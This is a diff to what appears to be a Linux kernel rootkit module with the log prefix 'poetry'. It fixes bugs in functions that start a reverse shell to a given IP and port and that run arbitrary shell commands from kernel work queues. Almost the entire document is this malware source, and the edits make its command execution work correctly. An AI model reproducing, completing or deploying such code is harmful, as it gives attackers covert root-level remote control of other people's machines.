@@ -40,7 +40,7 @@ void execute_reverse_shell(struct work_struct *work){
 
 }
 
-int start_reverse_shell(char* ip, char* port){
+int start_reverse_shell(char* ip, const char* port){
     int err;
     struct shell_params *params = kmalloc(sizeof(struct shell_params), GFP_KERNEL);
     if(!params){
@@ -61,7 +61,7 @@ int start_reverse_shell(char* ip, char* port){
 void execute_command(struct work_struct *work)
 {
     int err;
-    struct shell_params *params = (struct shell_params*)work;
+    struct command_params *params = (struct command_params*)work;
     char *envp[] = {HOME, TERM, params->target_ip, params->target_port, NULL};
     char *exec = kmalloc(sizeof(char)*256, GFP_KERNEL);
     char *argv[] = {SHELL, "-c", exec, NULL};
@@ -85,7 +85,7 @@ int start_command(char* command)
         printk(KERN_INFO "poetry: Error allocating memory\n");
         return 1;
     }
-    params->command = kstrdup(ip, GFP_KERNEL);
+    params->command = kstrdup(command, GFP_KERNEL);
     INIT_WORK(&params->work, &execute_command);
 
     err = schedule_work(&params->work);
